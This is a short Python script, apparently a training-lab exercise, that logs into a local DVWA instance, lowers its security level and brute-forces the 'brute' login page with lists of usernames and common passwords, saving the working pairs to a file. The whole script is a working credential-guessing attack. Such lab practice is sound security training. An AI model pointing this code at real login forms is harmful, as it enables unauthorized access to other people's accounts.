#!/usr/bin/env python3
import requests, time, os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "http://127.0.0.1:8080"
BRUTE = BASE + "/vulnerabilities/brute/"
LOGIN = BASE + "/login.php"
SECURL = BASE + "/security.php"
USERS = ["admin","pablo","1337","gordonb","smithy","test"]
PASSES = ["password","123456","admin","letmein","1234","root","test"]
WELCOME = ["Welcome to the password protected area","Welcome :: Damn Vulnerable Web App"]
USER_IMG_PREFIX = "/hackable/users/"

def success(content, user):
    text = content.decode("utf-8","ignore")
    if any(w in text for w in WELCOME): return True, "welcome_text"
    if (USER_IMG_PREFIX + user) in text: return True, "user_image"
    return False, "no_indicator"

def dvwa_login(sess, user="admin", pwd="password"):
    r = sess.post(LOGIN, data={"username":user,"password":pwd,"Login":"Login"}, allow_redirects=True, timeout=8)
    return r.status_code==200

def set_security_low(sess):
    # DVWA cambia security vía GET con parámetro seclev
    sess.get(SECURL, params={"seclev":"low","phpids":"0","submit":"Submit"}, allow_redirects=True, timeout=8)
    sess.cookies.set("security","low")

def try_pair(sess, u,p):
    r = sess.get(BRUTE, params={"username":u,"password":p,"Login":"Login"}, allow_redirects=True, timeout=8)
    ok, why = success(r.content, u)
    return u,p,ok,why,r.status_code

def main():
    print("=== Python brute (auto-login) ===")
    s = requests.Session()
    s.headers.update({"User-Agent":"Mozilla/5.0"})
    if not dvwa_login(s):
        print("No pude iniciar sesión como admin:password")
        return
    set_security_low(s)
    found=[]
    start=time.time()
    for u in USERS:
        for p in PASSES:
            u,p,ok,why,st = try_pair(s,u,p)
            if ok:
                print(f"✅ {u}:{p} ({why})")
                found.append((u,p,why))
            else:
                print(f"❌ {u}:{p}")
            time.sleep(0.02)
    print(f"-- Done in {time.time()-start:.2f}s. Found {len(found)}")
    if found:
        open("found.txt","w").write("\n".join(f"{u}:{p} # {r}" for u,p,r in found))
        print("Guardado: found.txt")

if __name__=="__main__":
    main()
